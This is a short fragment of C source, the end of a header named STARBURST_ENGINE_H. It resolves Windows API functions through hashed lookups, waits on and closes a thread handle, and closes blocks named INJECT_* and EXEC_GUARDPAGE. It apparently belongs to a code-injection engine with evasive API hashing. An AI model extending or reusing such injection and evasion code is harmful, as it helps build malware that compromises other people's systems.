        pCloseHandle pCH = (pCloseHandle)_resolve(H_MOD_KERNEL32, H_CloseHandle);
        if (pWFSO) pWFSO(hThread, INFINITE);
        if (pCH) pCH(hThread);
    }
    return 1;
#endif /* EXEC_GUARDPAGE */
#endif /* INJECT_* */
}

#endif /* STARBURST_ENGINE_H */
